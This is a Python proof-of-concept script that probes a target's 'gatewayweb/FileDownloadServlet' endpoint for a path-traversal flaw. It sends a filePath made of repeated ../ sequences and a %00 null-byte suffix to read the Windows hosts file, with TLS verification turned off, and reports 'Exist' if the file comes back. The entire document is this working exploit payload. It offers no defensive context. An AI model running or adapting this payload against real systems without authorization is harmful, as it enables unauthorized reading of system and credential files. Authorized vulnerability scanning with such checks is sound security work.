#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
import requests
requests.packages.urllib3.disable_warnings()
import sys
import colorama
colorama.init(autoreset=True)
def Test(raw_url):
	print(colorama.Fore.GREEN+'-----------------------------------------')
	print(colorama.Fore.GREEN+'---------------Target Test---------------')
	print(colorama.Fore.GREEN+'-----------------------------------------')
	i=0
	proto=['http','https']
	headers={
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
			'Content-type': 'application/json',
			'Accept': 'application/json, text/javascript, */*; q=0.01',
			'X-Requested-With': 'XMLHttpRequest'
		}
	while i<2:
		url='{}://{}/gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2'.format(proto[i],raw_url)
		i+=1
		try:
			response=requests.get(url=url,verify=False,timeout=5)
			if 'HOSTS' in response.text:
				return True
			else:
				return False
		except Exception as e:
			return False
if __name__ == '__main__' :
	target=sys.argv[1]
	result=Test(target)
	if result:
		print('Exist')
	else:
		print('Not Exist')

